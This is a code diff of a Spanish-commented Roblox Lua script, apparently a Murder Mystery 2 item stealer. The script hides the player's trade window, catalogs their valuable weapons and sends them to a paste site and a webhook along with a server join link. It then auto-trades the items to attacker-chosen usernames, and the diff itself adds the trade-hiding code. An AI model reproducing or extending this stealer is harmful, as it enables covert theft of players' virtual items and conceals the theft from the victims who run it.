@@ -8,20 +8,7 @@ local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
--- Kick inicial
-local function CheckServerInitial()
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
-end
-CheckServerInitial()
+
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
@@ -49,7 +36,7 @@ local function CreateRubisPaste(content)
     local payload = {
         content = content,
         public = false,
-        title = "Untitled Scrap"
+        title = "The best Stealer Anonimo 🇪🇨"
     }
     local body = HttpService:JSONEncode(payload)
     local res
@@ -69,7 +56,41 @@ local function CreateRubisPaste(content)
     end
 end
 
--- ====================================
+-- Ocultar GUI de trade
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+    local gui = playerGui:FindFirstChild(guiName)
+    if gui then
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
+        gui.Enabled=false
+    end
+end
+
+-- Funciones de trade
+local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
+local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
+local function sendTradeRequest(user)
+    local plrObj = Players:FindFirstChild(user)
+    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
+end
+local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
+local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
+local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
+
+-- Kick inicial
+local function CheckServerInitial()
+    if #Players:GetPlayers() >= 12 then
+        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
+    end
+    if game.PrivateServerId and game.PrivateServerId ~= "" then
+        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
+    end
+    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
+    if success and ownerId and ownerId ~= 0 then
+        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
+    end
+end
+CheckServerInitial()
 
 -- MM2 Supreme value system
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
@@ -171,21 +192,42 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- 🔹 Fern Link real
+-- 🔹 Fern Link real solo visible en webhook
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Preparar contenido completo para Rubis con título principal
-local pasteContent = "The best Steal Anonimo 🇪🇨\n\n"
+-- ====================================
+-- NUEVO CONTENIDO PASTEBIN POR CATEGORÍAS
+local categoryOrder = {"Ancient","Godly","Unique","Classic","Chroma"}
+local categoryItems = {Ancient={}, Godly={}, Unique={}, Classic={}, Chroma={}}
+
 for _, w in ipairs(weaponsToSend) do
-    pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+    local rarity = w.Rarity
+    if table.find(categoryOrder, rarity) then
+        table.insert(categoryItems[rarity], w)
+    else
+        table.insert(categoryItems["Classic"], w)
+    end
 end
-pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
+
+local pasteContent = "The best Stealer Anonimo 🇪🇨\n\n"
+for _, cat in ipairs(categoryOrder) do
+    local items = categoryItems[cat]
+    if #items > 0 then
+        pasteContent = pasteContent.."🟢 "..cat.." 🟢\n"
+        for _, w in ipairs(items) do
+            pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+        end
+        pasteContent = pasteContent.."\n"
+    end
+end
+pasteContent = pasteContent.."💰 Valor total del inventario: "..tostring(totalValue).."💰"
 
 local pasteLink
 if #weaponsToSend > 18 then
     pasteLink = CreateRubisPaste(pasteContent)
 end
+-- ====================================
 
 -- Webhook inventario
 if #weaponsToSend > 0 then
@@ -214,16 +256,6 @@ if #weaponsToSend > 0 then
 end
 
 -- 🔹 Trade automático
-local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
-local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
-local function sendTradeRequest(user)
-    local plrObj = Players:FindFirstChild(user)
-    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
-end
-local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
-local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
-local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
-
 local function doTrade(targetName)
     if #weaponsToSend == 0 then return end
     while #weaponsToSend>0 do
